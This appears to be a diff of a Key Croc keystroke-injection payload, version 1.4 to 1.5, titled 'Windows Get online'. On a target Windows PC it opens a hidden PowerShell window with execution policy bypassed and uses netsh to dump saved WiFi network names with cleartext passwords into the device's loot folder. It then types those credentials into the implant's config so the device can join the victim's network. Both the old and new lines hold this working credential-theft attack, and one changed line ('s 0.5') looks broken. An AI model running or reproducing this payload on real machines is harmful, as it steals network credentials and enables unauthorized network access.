@@ -1,108 +1,113 @@
 # Title:         Windows Get online   
 # Description:   Get online automatically to target pc wifi or to your own wifi
 # Author:        spywill
-# Version:       1.4
+# Version:       1.5
 # Category:      Key Croc
 #
 #
 MATCH getonline
-QUACK LOCK
+Q LOCK
 # --> Edit config.txt
 LED SETUP
-QUACK STRING "$(sed -i '9 a WIFI_SSID\nWIFI_PASS\nSSH ENABLE' /root/udisk/config.txt)"
-QUACK ENTER
+# --> Remone any existing WIFI setting
+Q STRING "$(sed -i -e '/^[WS]/d' /root/udisk/config.txt)"
+Q ENTER
+sleep 1
+# --> Edit config.txt with sed
+Q STRING "$(sed -i '9 a WIFI_SSID\nWIFI_PASS\nSSH ENABLE' /root/udisk/config.txt)"
+Q ENTER
 sleep 0.5
 # --> udisk unmount
 ATTACKMODE HID STORAGE
 sleep 5
-QUACK GUI r
+Q GUI r
 sleep 0.5
 # --> Open powershell
-QUACK STRING "powershell -NoP -NonI -W Hidden -Exec Bypass"
-QUACK ENTER
+Q STRING "powershell -NoP -NonI -W Hidden -Exec Bypass"
+Q ENTER
 sleep 0.5
 # --> Get KeyCroc drive
 LED ATTACK
-QUACK STRING "\$Croc = (gwmi win32_volume -f 'label=\"KeyCroc\"' | Select-Object -ExpandProperty DriveLetter)"
-QUACK ENTER
+Q STRING "\$Croc = (gwmi win32_volume -f 'label=\"KeyCroc\"' | Select-Object -ExpandProperty DriveLetter)"
+Q ENTER
 sleep 1
 # --> Create wifipass.txt with the taget pc SSID and PASSWD put in Keycroc loot folder
-QUACK STRING "(netsh wlan show networks) | Select-String \"\:(.+)\$\" | % {\$name=\$_.Matches.Groups[1].Value.Trim(); \$_} | %{(netsh wlan show profile name=\"\$name\" key=clear)} | Select-String \"Key Content\W+\:(.+)\$\" | % {\$pass=\$_.Matches.Groups[1].Value.Trim(); \$_} | %{[PSCustomObject]@{ PROFILE_NAME=\$name;PASSWORD=\$pass }} | Format-Table -Wrap | Out-File \"\$Croc\loot\wifipass.txt\""
-QUACK ENTER
+Q STRING "(netsh wlan show networks) | Select-String \"\:(.+)\$\" | % {\$name=\$_.Matches.Groups[1].Value.Trim(); \$_} | %{(netsh wlan show profile name=\"\$name\" key=clear)} | Select-String \"Key Content\W+\:(.+)\$\" | % {\$pass=\$_.Matches.Groups[1].Value.Trim(); \$_} | %{[PSCustomObject]@{ PROFILE_NAME=\$name;PASSWORD=\$pass }} | Format-Table | Out-File -encoding ASCII \"\$Croc\loot\wifipass.txt\""
+Q ENTER
 sleep 1
 # --> Open notepad with the KeyCroc config.txt
-QUACK STRING "notepad \$Croc\config.txt"
-QUACK ENTER
+Q STRING "notepad \$Croc\config.txt"
+Q ENTER
 sleep 1
-QUACK GUI r
-QUACK STRING "powershell -NoP -NonI -W Hidden -Exec Bypass"
-QUACK ENTER
+Q GUI r
+Q STRING "powershell -NoP -NonI -W Hidden -Exec Bypass"
+Q ENTER
 sleep 1
-QUACK STRING "\$Croc = (gwmi win32_volume -f 'label=\"KeyCroc\"' | Select-Object -ExpandProperty DriveLetter)"
-QUACK ENTER
+Q STRING "\$Croc = (gwmi win32_volume -f 'label=\"KeyCroc\"' | Select-Object -ExpandProperty DriveLetter)"
+Q ENTER
 sleep 1
 LED SETUP
 # --> Open wifipass.txt to copy and paste the SSID and PASSWD
-QUACK STRING "notepad \$Croc\loot\wifipass.txt"
-QUACK ENTER
+Q STRING "notepad \$Croc\loot\wifipass.txt"
+Q ENTER
 sleep 1
 # --> Copy and paste the SSID AND PASSWD to the config.txt
-QUACK CONTROL-g
+Q CONTROL-g
 sleep 0.5
-QUACK STRING "4"
-QUACK ENTER
-QUACK CONTROL-RIGHTARROW
-QUACK CONTROL-RIGHTARROW
+Q STRING "4"
+Q ENTER
+Q CONTROL-RIGHTARROW
+Q CONTROL-RIGHTARROW
 # --> Select the hole line
-QUACK CONTROL-SHIFT-LEFTARROW
+Q CONTROL-SHIFT-LEFTARROW
 # --> Copy
-QUACK CONTROL-c
+Q CONTROL-c
 sleep 0.5
 # --> Change windows
-QUACK CONTROL-ALT-TAB
-QUACK ENTER
+Q CONTROL-ALT-TAB
+Q ENTER
 sleep 0.5
 # --> select line to edit
-QUACK CONTROL-g
+Q CONTROL-g
+s 0.5
+Q STRING "11"
+Q ENTER
 sleep 0.5
-QUACK STRING "11"
-QUACK ENTER
-sleep 0.5
-QUACK CONTROL-RIGHTARROW
+Q CONTROL-RIGHTARROW
 # --> SPACEBAR is 00,00,2c
-QUACK KEYCODE 00,00,2c
+Q KEYCODE 00,00,2c
 # --> Paste
-QUACK CONTROL-v
+Q CONTROL-v
 sleep 0.5
-QUACK CONTROL-ALT-TAB
+Q CONTROL-ALT-TAB
 sleep 0.5
-QUACK ENTER
-QUACK CONTROL-g
+Q ENTER
+Q CONTROL-g
 sleep 0.5
-QUACK STRING "4"
-QUACK ENTER
-QUACK CONTROL-RIGHTARROW
-QUACK LEFTARROW
-QUACK CONTROL-SHIFT-LEFTARROW
-QUACK CONTROL-c
-QUACK CONTROL-ALT-TAB
+Q STRING "4"
+Q ENTER
+Q CONTROL-RIGHTARROW
+Q LEFTARROW
+Q CONTROL-SHIFT-LEFTARROW
+Q CONTROL-c
+Q CONTROL-ALT-TAB
 sleep 0.5
-QUACK ENTER
-QUACK CONTROL-g
+Q ENTER
+Q CONTROL-g
 sleep 0.5
-QUACK STRING "10"
-QUACK ENTER
-QUACK CONTROL-RIGHTARROW
-QUACK KEYCODE 00,00,2c
-QUACK CONTROL-v
+Q STRING "10"
+Q ENTER
+Q CONTROL-RIGHTARROW
+Q KEYCODE 00,00,2c
+Q CONTROL-v
 sleep 0.5
 # --> Save config.txt
-QUACK CONTROL w
-QUACK ENTER
+Q CONTROL w
+Q ENTER
 sleep 0.5
-QUACK CONTROL-ALT-TAB
-QUACK DELETE
+Q CONTROL-ALT-TAB
+Q DELETE
 # --> Returning to HID Mode
 ATTACKMODE HID
-QUACK UNLOCK
+Q UNLOCK
 LED FINISH
